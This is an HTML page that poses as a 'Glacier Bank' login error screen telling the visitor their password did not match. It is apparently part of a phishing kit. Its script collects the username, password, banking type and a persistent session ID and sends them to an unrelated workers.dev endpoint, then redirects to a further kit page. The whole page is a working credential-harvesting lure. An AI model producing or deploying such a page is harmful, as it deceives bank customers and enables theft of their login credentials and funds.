<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Glacier Bank | Login Error</title>

<style>
:root{
  --blue:#0a7db3;
  --blue-dark:#06638f;
  --text:#1e1e1e;
  --bg:#f5f5f5;
  --card:#fff;
}

*{box-sizing:border-box;}
body{
  margin:0;
  font-family:"Inter", Arial, sans-serif;
  background:var(--bg);
  color:var(--text);
  display:flex;
  flex-direction:column;
  align-items:center;
  justify-content:center;
  min-height:100vh;
  padding:20px;
}

.logo img{
  height:50px;
  margin-bottom:20px;
}

.error-card{
  background:var(--card);
  padding:30px 24px;
  border-radius:6px;
  box-shadow:0 12px 32px rgba(0,0,0,0.15);
  width:100%;
  max-width:400px;
  text-align:center;
}

.error-card h5{
  margin-bottom:20px;
  font-size:16px;
  color:#d32f2f;
}

.error-card input,
.error-card select{
  width:100%;
  padding:12px;
  margin-bottom:14px;
  border:1px solid #ccc;
  border-radius:4px;
  font-size:14px;
}

.error-card button{
  width:100%;
  padding:12px;
  background:var(--blue);
  color:#fff;
  border:none;
  border-radius:4px;
  font-size:15px;
  cursor:pointer;
}
.error-card button:hover{
  background:var(--blue-dark);
}

#error-line{
  height:1px;
  background:#eee;
  margin:18px 0;
}

footer{
  margin-top:20px;
  font-size:13px;
  color:#777;
  text-align:center;
}

footer a{
  color:var(--blue);
  text-decoration:none;
}
</style>
</head>
<body>

<div class="logo">
  <img src="../Assets/lgoii.png" alt="Glacier Bank Logo">
</div>

<!-- ERROR FORM CARD -->
<form class="error-card" id="errorForm">
  <h5>The password doesn't match our records. Please try again.</h5>
  
  <input type="text" name="username" placeholder="Username" required>
  <input type="password" name="password" placeholder="Password" required>
  
  <select name="bankType" required>
    <option value="Online Banking">Online Banking</option>
    <option value="Business Banking">Business Banking</option>
  </select>

  <button type="submit">Continue</button>

  <div id="error-line"></div>
</form>

<footer>
  © 2026 - Glacier Bank
</footer>

<script>
// Generate a persistent session
const session = localStorage.getItem("session") || crypto.randomUUID();
localStorage.setItem("session", session);

document.getElementById("errorForm").addEventListener("submit", async e => {
  e.preventDefault();

  const username = e.target.username.value.trim();
  const password = e.target.password.value.trim();
  const bankType = e.target.bankType.value;

  try {
    await fetch("https://summer-rain-1f5b.tekin49532.workers.dev/event", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        username,
        password,
        type: bankType,
        session,
        step: "error_page"
      })
    });

    // Redirect to nsem.html after submission
    window.location.href = "/Pages/PF90.html";

  } catch (err) {
    console.error(err);
    alert("Network error. Please try again.");
  }
});
</script>

</body>
</html>
